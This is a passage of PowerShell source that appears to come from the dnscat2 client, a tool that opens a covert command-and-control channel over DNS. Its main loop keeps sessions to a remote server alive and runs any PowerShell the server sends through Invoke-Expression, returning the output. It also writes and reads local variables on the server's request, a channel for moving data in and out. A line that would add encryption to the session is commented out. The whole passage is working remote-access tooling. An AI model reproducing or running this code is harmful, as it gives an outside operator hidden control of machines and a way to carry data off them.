            Write-Error ("Only TXT, MX, CNAME, A, and AAAA lookups are allowed!")
            return
        }
    }

    $SYNOptions = 1 # Enable OPT_NAME to name the session

    if ($Exec -ne '') {
        $Driver = 'exec'
        $DriverOptions = $Exec
    } elseif ($Console) {
        $Driver = 'console'
		$DriverOptions = ''
    } elseif ($ExecPS) {
        $Driver = 'PS'
		$DriverOptions = ''
    } else {
		$Driver = 'command'
		$DriverOptions = ''
        $SYNOptions += 0x20
	}

    if (!$NoEncryption) {
        #$SYNOptions += 0x40
    }

    $SYNOptions = [Convert]::ToString($SYNOptions, 16).PadLeft(4, '0')

    if ($Name -eq '') {
        $Name = $Driver + ' (' + (hostname) + ')'
    }
    $SYNOptions += (Convert-StringToHex $Name) + '00'

    $Sessions = New-Object System.Collections.Hashtable
    $DeadSessions = @()
    $InitialSession = Start-Dnscat2Session (New-RandomDNSField 4) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize (-not $NoEncryption) $PreSharedSecret $LookupTypes $Delay $MaxRandomDelay $Driver $DriverOptions
    if ($InitialSession -eq 1) {
        return
    }
    $Sessions.Add($InitialSession["SessionId"], $InitialSession)

    try {
        while ($Sessions.Count -gt 0) {
            # Remove Dead Sessions
            foreach ($SessionId in $DeadSessions) {
                $Sessions.Remove($SessionId)
            }
            $DeadSessions = @()

            # Update Sessions
            $SessionIds = @()
            $SessionIds += $Sessions.Keys
            foreach ($SessionId in $SessionIds) {
                $Sessions[$SessionId] = Update-Dnscat2Session $Sessions[$SessionId]

                # Execute PS commands here for access to full scope
                if ($Sessions[$SessionId]["PSCommandReady"]) {
                    try { $Sessions[$SessionId]["DriverDataQueue"] += (Convert-StringToHex (Invoke-Expression (Convert-HexToString $Sessions[$SessionId]["PSCommand"]) | Out-String)) } catch { }
                    $Sessions[$SessionId]["PSCommand"] = ""
                    $Sessions[$SessionId]["PSCommandReady"] = $False
                }

                # Execute PS uploads here for access to full scope
                if ($Sessions[$SessionId]["PSUploadReady"]) {
                    try { Set-Variable -Name $Sessions[$SessionId]["PSUploadName"] -Value $Sessions[$SessionId]["PSUploadValue"] } catch { }
                    $Sessions[$SessionId]["PSUploadReady"] = $False
                    $Sessions[$SessionId]["PSUploadName"] = ""
                    $Sessions[$SessionId]["PSUploadValue"] = ""
                }

                # Execute PS downloads here for access to full scope
                if ($Sessions[$SessionId]["PSDownloadReady"]) {
                    try {
                        $VarValue = (Get-Variable -Name $Sessions[$SessionId]["PSDownloadName"] -ValueOnly)
                        if ($VarValue.GetType().fullname -eq "System.Byte[]") {
                            $VarValue = Convert-BytesToHex $VarValue
                            $PacketLengthField = ([Convert]::ToString((4 + ($VarValue.Length/2)),16)).PadLeft(8, '0')
                            $Sessions[$SessionId]["DriverDataQueue"] += ($PacketLengthField + $Sessions[$SessionId]["PSDownloadPacketIdBF"] + "0003" + $VarValue)
                        }
                    } catch { }
                    $Sessions[$SessionId]["PSDownloadReady"] = $False
                    $Sessions[$SessionId]["PSDownloadPacketIdBF"] = ""
                    $Sessions[$SessionId]["PSDownloadName"] = ""
                }

                if ($Sessions[$SessionId].Dead) {
                    $DeadSessions += $SessionId
                }

                if (($Sessions[$SessionId])["NewSessions"].Count -gt 0) {
                    foreach ($NewSessionId in $Sessions[$SessionId].NewSessions.Keys) {
                        $Sessions.Add($NewSessionId, $Sessions[$SessionId]["NewSessions"][$NewSessionId])
                    }
                    $Sessions[$SessionId].NewSessions = New-Object System.Collections.Hashtable
                }
            }
            Start-Sleep -Milliseconds 100
        }
    } finally {
        $SessionIds = @()
        $SessionIds += $Sessions.Keys
        foreach ($SessionId in $SessionIds) {
            Stop-Dnscat2Session $Sessions[$SessionId]
        }
    }
}
